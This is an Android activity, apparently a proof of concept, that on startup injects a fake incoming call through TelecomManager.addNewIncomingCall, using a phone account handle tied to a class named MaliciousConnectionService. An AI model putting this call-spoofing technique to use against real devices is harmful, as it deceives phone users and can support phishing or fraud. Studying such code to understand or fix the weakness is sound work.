package com.simplypatrick.fakeincomingcall;

import android.content.ComponentName;
import android.content.Context;
import android.os.Bundle;
import android.support.v7.app.AppCompatActivity;
import android.telecom.PhoneAccountHandle;
import android.telecom.TelecomManager;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        addFakeIncomingCall();
    }

    private void addFakeIncomingCall() {
        TelecomManager telecomManager = (TelecomManager) getSystemService(Context.TELECOM_SERVICE);
        PhoneAccountHandle fakeHandle = new PhoneAccountHandle(new ComponentName(this, MaliciousConnectionService.class), "whatever");
        telecomManager.addNewIncomingCall(fakeHandle, null);
    }
}
